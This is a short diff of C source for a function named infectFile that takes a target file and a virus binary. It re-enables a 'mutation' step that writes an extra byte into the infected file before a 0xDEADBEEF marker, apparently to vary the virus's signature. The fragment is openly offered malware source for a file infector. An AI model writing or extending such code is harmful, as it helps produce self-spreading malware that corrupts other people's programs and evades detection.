@@ -150,7 +150,7 @@ int infectFile(char *fileToInfectName, char *virusBinName) {
         return -1;
     }
     // Mutate (add empty byte)
-    /*char mutationByte = 0x00;
+    char mutationByte = 0x00;
     if (fwrite(&mutationByte, 1, 1, tempFile) != 1) {
         perror("Could not write mutation byte to infected file");
         fclose(fileToInfect);
@@ -158,7 +158,7 @@ int infectFile(char *fileToInfectName, char *virusBinName) {
         fclose(tempFile);
         remove(tempFileName);
         return -1;
-    }*/
+    }
     // Write deadbeef pattern
     char deadbeef[4] = { 0xde, 0xad, 0xbe, 0xef };
     if (fwrite(&deadbeef, 1, 4, tempFile) != 4) {
